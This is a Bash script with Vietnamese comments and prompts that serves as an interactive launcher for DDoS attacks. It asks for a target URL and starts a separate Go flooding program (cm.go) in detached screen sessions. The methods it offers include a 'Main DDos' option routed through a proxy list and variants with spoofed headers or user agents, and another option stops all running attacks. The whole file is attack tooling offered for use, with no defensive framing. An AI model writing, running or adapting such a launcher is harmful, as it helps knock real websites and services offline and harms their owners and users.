#!/bin/bash

# Hàm dừng tất cả các phiên screen
stop_all_screens() {
    echo "Đang dừng tất cả cuộc tấn công..."
    screen -ls | grep Detached | awk '{print $1}' | xargs -I {} screen -S {} -X quit
    echo "Tất cả cuộc tấn công đã được dừng..."
}

# Kiểm tra yêu cầu cơ bản
check_requirements() {
    if ! [ -f "cm.go" ]; then
        echo "Error: File cm.go không tồn tại vui lòng kiểm tra lại"
        exit 1
    fi
    if ! command -v go &> /dev/null; then
        echo "Error: Go chưa được cài đặt vui lòng cài đặt Go trước khi chạy script"
        exit 1
    fi
}

# Hàm chạy attack
run_attack() {
    local method=$1
    local url=$2
    local flags=$3
    local log_file="attack_${method}.log"

    screen -dmS attack_method_$method bash -c "
        go run cm.go -site \"$url\" $flags
        if [ \$? -eq 0 ]; then
            echo \"Attack Success (Method $method)\" > $log_file
        else
            echo \"Attack Failed (Method $method)\" > $log_file
        fi
        screen -S attack_method_$method -X quit
    "
    echo "Start Attack (Method $method)!!"
}

# Kiểm tra yêu cầu trước khi chạy
check_requirements

# Vòng lặp menu
while true; do
    echo -e "\n=== Menu ==="
    echo "1: Main DDos (Random Flags + HTTP Proxy)"
    echo "2: Another Method (Hardcoded Flags No Proxy)"
    echo "3: Default Method (No Flags HTTP Call)"
    echo "4: Stop all attack"
    echo "5: Exit"
    echo -n "Chọn: "
    read method

    case $method in
        1)
            read -p "Nhập URL: " url
            if [ -z "$url" ]; then
                echo "URL không hợp lệ vui lòng thử lại"
                continue
            fi
            run_attack 1 "$url" "-heta -proxy proxy.txt -safe"
            ;;
        2)
            read -p "Nhập URL: " url
            if [ -z "$url" ]; then
                echo "URL không hợp lệ vui lòng thử lại"
                continue
            fi
            run_attack 2 "$url" "-agents -hetb -safe"
            ;;
        3)
            read -p "Nhập URL: " url
            if [ -z "$url" ]; then
                echo "URL không hợp lệ vui lòng thử lại"
                continue
            fi
            run_attack 3 "$url" "-agents -safe"
            ;;
        4)
            stop_all_screens
            ;;
        5)
            echo "Đã thoát"
            break
            ;;
        *)
            echo "Lựa chọn không hợp lệ vui lòng chọn lại"
            ;;
    esac
done
